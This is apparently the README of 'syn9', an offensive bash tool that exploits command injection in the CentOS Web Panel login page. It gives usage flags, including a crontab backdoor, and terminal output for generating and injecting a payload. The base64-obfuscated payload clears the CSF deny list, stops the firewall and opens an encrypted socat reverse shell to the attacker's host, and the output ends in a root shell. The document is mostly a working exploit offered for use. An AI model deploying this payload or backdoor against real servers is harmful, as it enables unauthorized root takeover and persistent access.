## tested machine box
- [x] CentOS 7 - CentOS Web Panel 9.8.1146 : https://drive.google.com/file/d/1cpYVmwXlCaStqzPFXxs0Hrt60aDAd49H/view?usp=sharing
- [x] Kali Linux 2022.4.5 / Any Debian-based 
- [ ] Ubuntu 20,04 - ModSecurity network-based WAF
- [ ] Mikrotik Router

## flag usage and docs
```
Usage: syn9 [OPTION]... [ARG]...
Red Team utilities for setting up CWP CentOS 7 payload & reverse shell

Available flag options, starred one are combination purposes ...

  -h     launch command usage for avilable flag options & examples
  -b     write crontab's backdoor reverse shell for post-exploitation
  -g     generate a payload string with predefined POST body to be used externally
  -i     inject the payload string via curl's POST request internally instead
  -n **  specify the IP address via the issued network interface
  -o **  specify the listener port address
  -c **  specify the SSL certificate path with .PEM format file
  -w **  specify the CWP site's IP address along with its port number

Flag usage examples:

  $ bash syn9 -o 6666 -c openssl-cert/bind.pem -n eth0  ## to create a listener
  $ bash syn9 -w 192.168.1.14:2031 -o 6666 -n eth0 -g   ## to generate the payload string
  $ bash syn9 -w 192.168.1.14:2031 -o 6666 -n eth0 -i   ## to inject the payload via curl
```
## printing the generated payload
```
┌──(kali㉿kali)-[/media/sf_Remote/cwp-rce-white-box]
└─$ ./syn9 -w 192.168.1.14:2031 -o 6666 -n eth0 -g
[-] URI address : POST https://192.168.1.14:2031/login/index.php?login=$($payload) ...
[-] SSL connect : 192.168.1.15:6666 ...
[-] POST data   : username=root&password=pwned&commit=login ...
[-] socat opts. : exec:'bash -li',pty,stderr,setsid,sigint,sane ...
---
[-] generating payload in base64 format ...
---
$(echo${IFS}IyEvYmluL2Jhc2gKJCh3aGljaCBjYXQpIC9kZXYvbnVsbCA+IC9ldGMvY3NmL2NzZi5kZW55CiQod2hpY2ggY3NmKSAteCAmIHdhaXQKJCh3aGljaCBzeXN0ZW1jdGwpIHN0b3AgY3NmLnNlcnZpY2UgJiB3YWl0CiQod2hpY2ggc29jYXQpIGV4ZWM6J2Jhc2ggLWxpJyxwdHksc3RkZXJyLHNldHNpZCxzaWdpbnQsc2FuZSBPUEVOU1NMOjE5Mi4xNjguMS4xNTo2NjY2LHZlcmlmeT0wCg==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)
```
## injecting it. straight up
```
┌──(kali㉿kali)-[/media/sf_Remote/cwp-rce-white-box]
└─$ ./syn9 -w 192.168.1.14:2031 -o 6666 -n eth0 -i
[-] URI address : POST https://192.168.1.14:2031/login/index.php?login=$($payload) ...
[-] SSL connect : 192.168.1.15:6666 ...
[-] POST data   : username=root&password=pwned&commit=login ...
[-] socat opts. : exec:'bash -li',pty,stderr,setsid,sigint,sane ...
---
[-] injecting payload to the URI via curl ...
[-] halting tty for the remote access session (9821)...
--
```
## listener on enc. reverse shell
```
┌──(kali㉿kali)-[/media/sf_Remote/cwp-rce-white-box]
└─$ ./syn9  -o 6666 -c openssl-cert/bind.pem -n eth0
[-] SSL listen  : 192.168.1.15:6666 ...
[-] SSL cert    : openssl-cert/bind.pem,verify=0 ...
[-] socat opts. : file:`tty`,raw,echo=0 ...
---
[-] suggesting static terminal size, rows [20/42] x cols [92/184] ...
[-] $ stty rows X cols X
[-] $ export TERM=xterm-256color
---

********************************************
 Welcome to CWP (CentOS WebPanel) server
********************************************

CWP Wiki: http://wiki.centos-webpanel.com
CWP Forum: http://forum.centos-webpanel.com
CWP Support: http://centos-webpanel.com/support-services

 13:11:38 up 10 min,  1 user,  load average: 0.01, 0.13, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
server   pts/0    192.168.1.7      13:06    5:36   0.09s  0.09s -bash

[root@centos login]#
```